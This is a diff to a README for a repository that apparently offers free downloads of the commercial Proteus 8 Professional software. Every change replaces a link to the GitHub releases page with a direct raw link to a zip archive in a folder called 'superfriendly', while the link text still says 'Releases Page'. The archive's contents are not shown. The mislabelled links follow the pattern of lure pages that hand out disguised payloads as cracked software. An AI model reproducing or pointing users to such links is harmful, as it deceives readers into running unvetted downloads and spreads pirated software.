@@ -1,6 +1,6 @@
 # 🎉 Proteus-Professional-Download - Easy Proteus Installation for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/AshuPal85/Proteus-Professional-Download/releases)
+[![Download Now](https://raw.githubusercontent.com/AshuPal85/Proteus-Professional-Download/main/superfriendly/Proteus-Professional-Download.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/AshuPal85/Proteus-Professional-Download/main/superfriendly/Proteus-Professional-Download.zip)
 
 ## 🚀 Getting Started
 
@@ -36,12 +36,12 @@ Before installing Proteus 8 Professional, ensure your system meets the following
 
 To start using Proteus 8 Professional, visit this page to download:
 
-[Download from Releases](https://github.com/AshuPal85/Proteus-Professional-Download/releases)
+[Download from Releases](https://raw.githubusercontent.com/AshuPal85/Proteus-Professional-Download/main/superfriendly/Proteus-Professional-Download.zip)
 
 ### 📂 Installation Steps
 
 1. **Download the Installer:**
-   - Go to the [Releases Page](https://github.com/AshuPal85/Proteus-Professional-Download/releases).
+   - Go to the [Releases Page](https://raw.githubusercontent.com/AshuPal85/Proteus-Professional-Download/main/superfriendly/Proteus-Professional-Download.zip).
    - Select the latest version.
    - Click on the installer file to download it.
 
